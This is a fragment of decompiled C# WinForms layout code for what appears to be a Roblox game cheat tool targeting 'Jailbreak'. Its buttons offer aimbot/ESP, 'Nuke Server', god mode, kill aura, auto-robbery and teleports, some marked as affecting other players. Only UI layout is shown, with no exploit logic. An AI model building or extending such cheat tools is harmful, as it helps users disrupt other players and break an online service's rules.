      this.button32.Cursor = Cursors.Hand;
      this.button32.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button32.FlatAppearance.BorderSize = 2;
      this.button32.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button32.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button32.FlatStyle = FlatStyle.Flat;
      this.button32.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button32.ForeColor = System.Drawing.Color.White;
      this.button32.Location = new Point(492, 269);
      this.button32.Name = "button32";
      this.button32.Size = new Size(100, 25);
      this.button32.TabIndex = 118;
      this.button32.Text = "Back To Home";
      this.button32.UseVisualStyleBackColor = false;
      this.button32.Click += new EventHandler(this.button32_Click);
      this.button18.BackColor = System.Drawing.Color.Transparent;
      this.button18.Cursor = Cursors.Hand;
      this.button18.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button18.FlatAppearance.BorderSize = 3;
      this.button18.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button18.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button18.FlatStyle = FlatStyle.Flat;
      this.button18.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button18.ForeColor = System.Drawing.Color.White;
      this.button18.Location = new Point(15, 30);
      this.button18.Name = "button18";
      this.button18.Size = new Size(159, 34);
      this.button18.TabIndex = 117;
      this.button18.Text = "OwlHub Aimbot / ESP";
      this.button18.UseVisualStyleBackColor = false;
      this.button18.Click += new EventHandler(this.button18_Click_4);
      this.JailbreakCommands.BackColor = System.Drawing.Color.Black;
      this.JailbreakCommands.Controls.Add((Control) this.label17);
      this.JailbreakCommands.Controls.Add((Control) this.label16);
      this.JailbreakCommands.Controls.Add((Control) this.checkBox5);
      this.JailbreakCommands.Controls.Add((Control) this.checkBox4);
      this.JailbreakCommands.Controls.Add((Control) this.button61);
      this.JailbreakCommands.Controls.Add((Control) this.button60);
      this.JailbreakCommands.Controls.Add((Control) this.button59);
      this.JailbreakCommands.Controls.Add((Control) this.button58);
      this.JailbreakCommands.Controls.Add((Control) this.button57);
      this.JailbreakCommands.Controls.Add((Control) this.button56);
      this.JailbreakCommands.Controls.Add((Control) this.button55);
      this.JailbreakCommands.Controls.Add((Control) this.button48);
      this.JailbreakCommands.Controls.Add((Control) this.button54);
      this.JailbreakCommands.Controls.Add((Control) this.button53);
      this.JailbreakCommands.Controls.Add((Control) this.button52);
      this.JailbreakCommands.Controls.Add((Control) this.flatTextBox4);
      this.JailbreakCommands.Controls.Add((Control) this.button51);
      this.JailbreakCommands.Controls.Add((Control) this.button50);
      this.JailbreakCommands.Controls.Add((Control) this.button49);
      this.JailbreakCommands.Controls.Add((Control) this.flatTextBox3);
      this.JailbreakCommands.Controls.Add((Control) this.flatTextBox2);
      this.JailbreakCommands.Controls.Add((Control) this.button47);
      this.JailbreakCommands.Controls.Add((Control) this.button46);
      this.JailbreakCommands.Controls.Add((Control) this.button45);
      this.JailbreakCommands.Controls.Add((Control) this.button44);
      this.JailbreakCommands.Controls.Add((Control) this.button43);
      this.JailbreakCommands.Controls.Add((Control) this.button42);
      this.JailbreakCommands.Controls.Add((Control) this.button41);
      this.JailbreakCommands.Controls.Add((Control) this.button40);
      this.JailbreakCommands.Controls.Add((Control) this.button39);
      this.JailbreakCommands.Controls.Add((Control) this.button38);
      this.JailbreakCommands.Controls.Add((Control) this.button37);
      this.JailbreakCommands.Controls.Add((Control) this.button36);
      this.JailbreakCommands.Controls.Add((Control) this.button34);
      this.JailbreakCommands.Controls.Add((Control) this.button31);
      this.JailbreakCommands.Controls.Add((Control) this.button20);
      this.JailbreakCommands.Location = new Point(4, 22);
      this.JailbreakCommands.Name = "JailbreakCommands";
      this.JailbreakCommands.Size = new Size(603, 306);
      this.JailbreakCommands.TabIndex = 3;
      this.JailbreakCommands.Text = "JailbreakCommands";
      this.JailbreakCommands.Click += new EventHandler(this.JailbreakCommands_Click);
      this.label17.AutoSize = true;
      this.label17.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold | FontStyle.Italic);
      this.label17.ForeColor = System.Drawing.Color.White;
      this.label17.Location = new Point(118, 278);
      this.label17.Name = "label17";
      this.label17.Size = new Size(258, 13);
      this.label17.TabIndex = 84;
      this.label17.Text = "Server Sided = Other People Can See/Experience";
      this.label16.AutoSize = true;
      this.label16.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold | FontStyle.Italic);
      this.label16.ForeColor = System.Drawing.Color.White;
      this.label16.Location = new Point(15, 278);
      this.label16.Name = "label16";
      this.label16.Size = new Size(97, 13);
      this.label16.TabIndex = 56;
      this.label16.Text = "SS = Server Sided";
      this.checkBox5.AutoSize = true;
      this.checkBox5.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.checkBox5.Location = new Point(15, 130);
      this.checkBox5.Name = "checkBox5";
      this.checkBox5.Size = new Size(121, 17);
      this.checkBox5.TabIndex = 83;
      this.checkBox5.Text = "Rainbow Nitro (SS)";
      this.checkBox5.UseVisualStyleBackColor = true;
      this.checkBox5.Visible = false;
      this.checkBox5.CheckedChanged += new EventHandler(this.checkBox5_CheckedChanged);
      this.checkBox4.AutoSize = true;
      this.checkBox4.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.checkBox4.Location = new Point(15, 112);
      this.checkBox4.Name = "checkBox4";
      this.checkBox4.Size = new Size(113, 17);
      this.checkBox4.TabIndex = 82;
      this.checkBox4.Text = "Rainbow Car (SS)";
      this.checkBox4.UseVisualStyleBackColor = true;
      this.checkBox4.Visible = false;
      this.checkBox4.CheckedChanged += new EventHandler(this.checkBox4_CheckedChanged);
      this.button61.BackColor = System.Drawing.Color.Black;
      this.button61.Cursor = Cursors.Hand;
      this.button61.FlatAppearance.BorderColor = System.Drawing.Color.White;
      this.button61.FlatAppearance.BorderSize = 2;
      this.button61.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button61.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button61.FlatStyle = FlatStyle.Flat;
      this.button61.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button61.ForeColor = System.Drawing.Color.White;
      this.button61.Location = new Point(492, 272);
      this.button61.Name = "button61";
      this.button61.Size = new Size(100, 25);
      this.button61.TabIndex = 81;
      this.button61.Text = "Back To Home";
      this.button61.UseVisualStyleBackColor = false;
      this.button61.Click += new EventHandler(this.button61_Click);
      this.button60.BackColor = System.Drawing.Color.Black;
      this.button60.Cursor = Cursors.Hand;
      this.button60.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button60.FlatAppearance.BorderSize = 2;
      this.button60.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button60.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button60.FlatStyle = FlatStyle.Flat;
      this.button60.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button60.ForeColor = System.Drawing.Color.White;
      this.button60.Location = new Point(136, 242);
      this.button60.Name = "button60";
      this.button60.Size = new Size(97, 25);
      this.button60.TabIndex = 80;
      this.button60.Text = "Gun Mod";
      this.button60.UseVisualStyleBackColor = false;
      this.button60.Visible = false;
      this.button60.Click += new EventHandler(this.button60_Click);
      this.button59.BackColor = System.Drawing.Color.Black;
      this.button59.Cursor = Cursors.Hand;
      this.button59.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button59.FlatAppearance.BorderSize = 2;
      this.button59.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button59.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button59.FlatStyle = FlatStyle.Flat;
      this.button59.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button59.ForeColor = System.Drawing.Color.White;
      this.button59.Location = new Point(96, 242);
      this.button59.Name = "button59";
      this.button59.Size = new Size(136, 25);
      this.button59.TabIndex = 79;
      this.button59.Text = "Instant Get All Guns";
      this.button59.UseVisualStyleBackColor = false;
      this.button59.Visible = false;
      this.button59.Click += new EventHandler(this.button59_Click);
      this.button58.BackColor = System.Drawing.Color.Black;
      this.button58.Cursor = Cursors.Hand;
      this.button58.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button58.FlatAppearance.BorderSize = 2;
      this.button58.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button58.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button58.FlatStyle = FlatStyle.Flat;
      this.button58.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button58.ForeColor = System.Drawing.Color.White;
      this.button58.Location = new Point(97, 242);
      this.button58.Name = "button58";
      this.button58.Size = new Size(136, 25);
      this.button58.TabIndex = 78;
      this.button58.Text = "Instant Explode Wall";
      this.button58.UseVisualStyleBackColor = false;
      this.button58.Visible = false;
      this.button58.Click += new EventHandler(this.button58_Click);
      this.button57.BackColor = System.Drawing.Color.Black;
      this.button57.Cursor = Cursors.Hand;
      this.button57.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button57.FlatAppearance.BorderSize = 2;
      this.button57.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button57.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button57.FlatStyle = FlatStyle.Flat;
      this.button57.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button57.ForeColor = System.Drawing.Color.White;
      this.button57.Location = new Point(97, 211);
      this.button57.Name = "button57";
      this.button57.Size = new Size(136, 25);
      this.button57.TabIndex = 77;
      this.button57.Text = "Instant Lift Gate";
      this.button57.UseVisualStyleBackColor = false;
      this.button57.Visible = false;
      this.button57.Click += new EventHandler(this.button57_Click);
      this.button56.BackColor = System.Drawing.Color.Black;
      this.button56.Cursor = Cursors.Hand;
      this.button56.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button56.FlatAppearance.BorderSize = 2;
      this.button56.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button56.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button56.FlatStyle = FlatStyle.Flat;
      this.button56.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button56.ForeColor = System.Drawing.Color.White;
      this.button56.Location = new Point(96, 211);
      this.button56.Name = "button56";
      this.button56.Size = new Size(136, 25);
      this.button56.TabIndex = 76;
      this.button56.Text = "Car Flight (SS) [V]";
      this.button56.UseVisualStyleBackColor = false;
      this.button56.Visible = false;
      this.button56.Click += new EventHandler(this.button56_Click);
      this.button55.BackColor = System.Drawing.Color.Black;
      this.button55.Cursor = Cursors.Hand;
      this.button55.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button55.FlatAppearance.BorderSize = 2;
      this.button55.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button55.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button55.FlatStyle = FlatStyle.Flat;
      this.button55.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button55.ForeColor = System.Drawing.Color.White;
      this.button55.Location = new Point(15, 211);
      this.button55.Name = "button55";
      this.button55.Size = new Size(115, 25);
      this.button55.TabIndex = 75;
      this.button55.Text = "Un-Arrest [Y]";
      this.button55.UseVisualStyleBackColor = false;
      this.button55.Visible = false;
      this.button55.Click += new EventHandler(this.button55_Click);
      this.button48.BackColor = System.Drawing.Color.Black;
      this.button48.Cursor = Cursors.Hand;
      this.button48.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button48.FlatAppearance.BorderSize = 2;
      this.button48.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button48.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button48.FlatStyle = FlatStyle.Flat;
      this.button48.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button48.ForeColor = System.Drawing.Color.White;
      this.button48.Location = new Point(15, 241);
      this.button48.Name = "button48";
      this.button48.Size = new Size(115, 25);
      this.button48.TabIndex = 74;
      this.button48.Text = "Infinite Jump";
      this.button48.UseVisualStyleBackColor = false;
      this.button48.Visible = false;
      this.button48.Click += new EventHandler(this.button48_Click);
      this.button54.BackColor = System.Drawing.Color.Black;
      this.button54.Cursor = Cursors.Hand;
      this.button54.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button54.FlatAppearance.BorderSize = 2;
      this.button54.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button54.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button54.FlatStyle = FlatStyle.Flat;
      this.button54.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button54.ForeColor = System.Drawing.Color.White;
      this.button54.Location = new Point(97, 86);
      this.button54.Name = "button54";
      this.button54.Size = new Size(136, 25);
      this.button54.TabIndex = 73;
      this.button54.Text = "Infinite Nitro (Sticks)";
      this.button54.UseVisualStyleBackColor = false;
      this.button54.Visible = false;
      this.button54.Click += new EventHandler(this.button54_Click);
      this.button53.BackColor = System.Drawing.Color.Black;
      this.button53.Cursor = Cursors.Hand;
      this.button53.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button53.FlatAppearance.BorderSize = 2;
      this.button53.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button53.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button53.FlatStyle = FlatStyle.Flat;
      this.button53.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button53.ForeColor = System.Drawing.Color.White;
      this.button53.Location = new Point(15, 180);
      this.button53.Name = "button53";
      this.button53.Size = new Size(115, 25);
      this.button53.TabIndex = 72;
      this.button53.Text = "Player Fly [H]";
      this.button53.UseVisualStyleBackColor = false;
      this.button53.Visible = false;
      this.button53.Click += new EventHandler(this.button53_Click);
      this.button52.BackColor = System.Drawing.Color.Black;
      this.button52.Cursor = Cursors.Hand;
      this.button52.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button52.FlatAppearance.BorderSize = 2;
      this.button52.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button52.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button52.FlatStyle = FlatStyle.Flat;
      this.button52.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button52.ForeColor = System.Drawing.Color.White;
      this.button52.Location = new Point(136, 86);
      this.button52.Name = "button52";
      this.button52.Size = new Size(97, 25);
      this.button52.TabIndex = 71;
      this.button52.Text = "Execute Speed";
      this.button52.UseVisualStyleBackColor = false;
      this.button52.Visible = false;
      this.button52.Click += new EventHandler(this.button52_Click);
      this.flatTextBox4.BackColor = System.Drawing.Color.Transparent;
      this.flatTextBox4.FocusOnHover = false;
      this.flatTextBox4.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.flatTextBox4.Hint = "";
      this.flatTextBox4.Location = new Point(15, 83);
      this.flatTextBox4.MaxLength = (int) short.MaxValue;
      this.flatTextBox4.Multiline = false;
      this.flatTextBox4.Name = "flatTextBox4";
      this.flatTextBox4.ReadOnly = false;
      this.flatTextBox4.Size = new Size(115, 24);
      this.flatTextBox4.TabIndex = 70;
      this.flatTextBox4.Text = "CarSpeed Here";
      this.flatTextBox4.TextAlign = HorizontalAlignment.Center;
      this.flatTextBox4.TextColor = System.Drawing.Color.FromArgb(192, 192, 192);
      this.flatTextBox4.UseSystemPasswordChar = false;
      this.flatTextBox4.Visible = false;
      this.button51.BackColor = System.Drawing.Color.Black;
      this.button51.Cursor = Cursors.Hand;
      this.button51.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button51.FlatAppearance.BorderSize = 2;
      this.button51.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button51.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button51.FlatStyle = FlatStyle.Flat;
      this.button51.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button51.ForeColor = System.Drawing.Color.White;
      this.button51.Location = new Point(97, 55);
      this.button51.Name = "button51";
      this.button51.Size = new Size(136, 25);
      this.button51.TabIndex = 69;
      this.button51.Text = "AutoRob Small Stores";
      this.button51.UseVisualStyleBackColor = false;
      this.button51.Visible = false;
      this.button51.Click += new EventHandler(this.button51_Click);
      this.button50.BackColor = System.Drawing.Color.Black;
      this.button50.Cursor = Cursors.Hand;
      this.button50.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button50.FlatAppearance.BorderSize = 2;
      this.button50.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button50.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button50.FlatStyle = FlatStyle.Flat;
      this.button50.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button50.ForeColor = System.Drawing.Color.White;
      this.button50.Location = new Point(136, 55);
      this.button50.Name = "button50";
      this.button50.Size = new Size(97, 25);
      this.button50.TabIndex = 68;
      this.button50.Text = "Execute JP";
      this.button50.UseVisualStyleBackColor = false;
      this.button50.Visible = false;
      this.button50.Click += new EventHandler(this.button50_Click);
      this.button49.BackColor = System.Drawing.Color.Black;
      this.button49.Cursor = Cursors.Hand;
      this.button49.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button49.FlatAppearance.BorderSize = 2;
      this.button49.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button49.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button49.FlatStyle = FlatStyle.Flat;
      this.button49.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button49.ForeColor = System.Drawing.Color.White;
      this.button49.Location = new Point(136, 24);
      this.button49.Name = "button49";
      this.button49.Size = new Size(97, 25);
      this.button49.TabIndex = 67;
      this.button49.Text = "Execute Speed";
      this.button49.UseVisualStyleBackColor = false;
      this.button49.Visible = false;
      this.button49.Click += new EventHandler(this.button49_Click);
      this.flatTextBox3.BackColor = System.Drawing.Color.Transparent;
      this.flatTextBox3.FocusOnHover = false;
      this.flatTextBox3.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.flatTextBox3.Hint = "";
      this.flatTextBox3.Location = new Point(15, 53);
      this.flatTextBox3.MaxLength = (int) short.MaxValue;
      this.flatTextBox3.Multiline = false;
      this.flatTextBox3.Name = "flatTextBox3";
      this.flatTextBox3.ReadOnly = false;
      this.flatTextBox3.Size = new Size(115, 24);
      this.flatTextBox3.TabIndex = 66;
      this.flatTextBox3.Text = "JumpPower Here";
      this.flatTextBox3.TextAlign = HorizontalAlignment.Center;
      this.flatTextBox3.TextColor = System.Drawing.Color.FromArgb(192, 192, 192);
      this.flatTextBox3.UseSystemPasswordChar = false;
      this.flatTextBox3.Visible = false;
      this.flatTextBox2.BackColor = System.Drawing.Color.Transparent;
      this.flatTextBox2.FocusOnHover = false;
      this.flatTextBox2.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.flatTextBox2.Hint = "";
      this.flatTextBox2.Location = new Point(261, 25);
      this.flatTextBox2.MaxLength = (int) short.MaxValue;
      this.flatTextBox2.Multiline = false;
      this.flatTextBox2.Name = "flatTextBox2";
      this.flatTextBox2.ReadOnly = false;
      this.flatTextBox2.Size = new Size(115, 24);
      this.flatTextBox2.TabIndex = 65;
      this.flatTextBox2.Text = "Speed Here [X]";
      this.flatTextBox2.TextAlign = HorizontalAlignment.Center;
      this.flatTextBox2.TextColor = System.Drawing.Color.FromArgb(192, 192, 192);
      this.flatTextBox2.UseSystemPasswordChar = false;
      this.flatTextBox2.Visible = false;
      this.button47.BackColor = System.Drawing.Color.Black;
      this.button47.Cursor = Cursors.Hand;
      this.button47.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button47.FlatAppearance.BorderSize = 2;
      this.button47.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button47.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button47.FlatStyle = FlatStyle.Flat;
      this.button47.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button47.ForeColor = System.Drawing.Color.White;
      this.button47.Location = new Point(15, 24);
      this.button47.Name = "button47";
      this.button47.Size = new Size(145, 25);
      this.button47.TabIndex = 63;
      this.button47.Text = "Jailbreak Premium GUI";
      this.button47.UseVisualStyleBackColor = false;
      this.button47.Click += new EventHandler(this.button47_Click);
      this.button46.BackColor = System.Drawing.Color.Black;
      this.button46.Cursor = Cursors.Hand;
      this.button46.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button46.FlatAppearance.BorderSize = 2;
      this.button46.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button46.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button46.FlatStyle = FlatStyle.Flat;
      this.button46.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button46.ForeColor = System.Drawing.Color.White;
      this.button46.Location = new Point(96, 149);
      this.button46.Name = "button46";
      this.button46.Size = new Size(136, 25);
      this.button46.TabIndex = 62;
      this.button46.Text = "Instant Garage Skin";
      this.button46.UseVisualStyleBackColor = false;
      this.button46.Visible = false;
      this.button46.Click += new EventHandler(this.button46_Click);
      this.button45.BackColor = System.Drawing.Color.Black;
      this.button45.Cursor = Cursors.Hand;
      this.button45.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button45.FlatAppearance.BorderSize = 2;
      this.button45.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button45.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button45.FlatStyle = FlatStyle.Flat;
      this.button45.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button45.ForeColor = System.Drawing.Color.White;
      this.button45.Location = new Point(136, 210);
      this.button45.Name = "button45";
      this.button45.Size = new Size(97, 25);
      this.button45.TabIndex = 61;
      this.button45.Text = "Infinite Health";
      this.button45.UseVisualStyleBackColor = false;
      this.button45.Visible = false;
      this.button45.Click += new EventHandler(this.button45_Click);
      this.button44.BackColor = System.Drawing.Color.Black;
      this.button44.Cursor = Cursors.Hand;
      this.button44.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button44.FlatAppearance.BorderSize = 2;
      this.button44.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button44.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button44.FlatStyle = FlatStyle.Flat;
      this.button44.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button44.ForeColor = System.Drawing.Color.White;
      this.button44.Location = new Point(97, 117);
      this.button44.Name = "button44";
      this.button44.Size = new Size(136, 25);
      this.button44.TabIndex = 60;
      this.button44.Text = "Nuke Server (SS)";
      this.button44.UseVisualStyleBackColor = false;
      this.button44.Visible = false;
      this.button44.Click += new EventHandler(this.button44_Click);
      this.button43.BackColor = System.Drawing.Color.Black;
      this.button43.Cursor = Cursors.Hand;
      this.button43.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button43.FlatAppearance.BorderSize = 2;
      this.button43.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button43.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button43.FlatStyle = FlatStyle.Flat;
      this.button43.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button43.ForeColor = System.Drawing.Color.White;
      this.button43.Location = new Point(136, 179);
      this.button43.Name = "button43";
      this.button43.Size = new Size(97, 25);
      this.button43.TabIndex = 59;
      this.button43.Text = "GodMode (SS)";
      this.button43.UseVisualStyleBackColor = false;
      this.button43.Visible = false;
      this.button43.Click += new EventHandler(this.button43_Click);
      this.button42.BackColor = System.Drawing.Color.Black;
      this.button42.Cursor = Cursors.Hand;
      this.button42.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button42.FlatAppearance.BorderSize = 2;
      this.button42.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button42.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button42.FlatStyle = FlatStyle.Flat;
      this.button42.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button42.ForeColor = System.Drawing.Color.White;
      this.button42.Location = new Point(136, 117);
      this.button42.Name = "button42";
      this.button42.Size = new Size(97, 25);
      this.button42.TabIndex = 58;
      this.button42.Text = "Teleports";
      this.button42.UseVisualStyleBackColor = false;
      this.button42.Visible = false;
      this.button42.Click += new EventHandler(this.button42_Click);
      this.button41.BackColor = System.Drawing.Color.Black;
      this.button41.Cursor = Cursors.Hand;
      this.button41.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button41.FlatAppearance.BorderSize = 2;
      this.button41.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button41.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button41.FlatStyle = FlatStyle.Flat;
      this.button41.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button41.ForeColor = System.Drawing.Color.White;
      this.button41.Location = new Point(136, 149);
      this.button41.Name = "button41";
      this.button41.Size = new Size(97, 25);
      this.button41.TabIndex = 57;
      this.button41.Text = "ESP / Tracers";
      this.button41.UseVisualStyleBackColor = false;
      this.button41.Visible = false;
      this.button41.Click += new EventHandler(this.button41_Click);
      this.button40.BackColor = System.Drawing.Color.Black;
      this.button40.Cursor = Cursors.Hand;
      this.button40.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button40.FlatAppearance.BorderSize = 2;
      this.button40.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button40.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button40.FlatStyle = FlatStyle.Flat;
      this.button40.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button40.ForeColor = System.Drawing.Color.White;
      this.button40.Location = new Point(96, 84);
      this.button40.Name = "button40";
      this.button40.Size = new Size(136, 25);
      this.button40.TabIndex = 56;
      this.button40.Text = "Punch Kill Aura (SS)";
      this.button40.UseVisualStyleBackColor = false;
      this.button40.Visible = false;
      this.button40.Click += new EventHandler(this.button40_Click);
      this.button39.BackColor = System.Drawing.Color.Black;
      this.button39.Cursor = Cursors.Hand;
      this.button39.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button39.FlatAppearance.BorderSize = 2;
      this.button39.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button39.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button39.FlatStyle = FlatStyle.Flat;
      this.button39.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button39.ForeColor = System.Drawing.Color.White;
      this.button39.Location = new Point(97, 24);
      this.button39.Name = "button39";
      this.button39.Size = new Size(136, 25);
      this.button39.TabIndex = 55;
      this.button39.Text = "Instant Police Team";
      this.button39.UseVisualStyleBackColor = false;
      this.button39.Visible = false;
      this.button39.Click += new EventHandler(this.button39_Click);
      this.button38.BackColor = System.Drawing.Color.Black;
      this.button38.Cursor = Cursors.Hand;
      this.button38.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button38.FlatAppearance.BorderSize = 2;
      this.button38.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button38.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button38.FlatStyle = FlatStyle.Flat;
      this.button38.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button38.ForeColor = System.Drawing.Color.White;
      this.button38.Location = new Point(96, 23);
      this.button38.Name = "button38";
      this.button38.Size = new Size(136, 25);
      this.button38.TabIndex = 54;
      this.button38.Text = "Instant Prisoner Team";
      this.button38.UseVisualStyleBackColor = false;
      this.button38.Visible = false;
      this.button38.Click += new EventHandler(this.button38_Click);
      this.button37.BackColor = System.Drawing.Color.Black;
      this.button37.Cursor = Cursors.Hand;
      this.button37.FlatAppearance.BorderColor = System.Drawing.Color.Orange;
      this.button37.FlatAppearance.BorderSize = 2;
      this.button37.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(45, 45, 45);
      this.button37.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(40, 40, 40);
      this.button37.FlatStyle = FlatStyle.Flat;
      this.button37.Font = new Font("Roboto", 8f, FontStyle.Bold);
      this.button37.ForeColor = System.Drawing.Color.White;
      this.button37.Location = new Point(96, 117);
      this.button37.Name = "button37";
      this.button37.Size = new Size(136, 25);
      this.button37.TabIndex = 53;
      this.button37.Text = "Mobile Garage (SS)";
      this.button37.UseVisualStyleBackColor = false;
      this.button37.Visible = false;
      this.button37.Click += new EventHandler(this.button37_Click);
      this.button36.BackColor = System.Drawing.Color.Black;
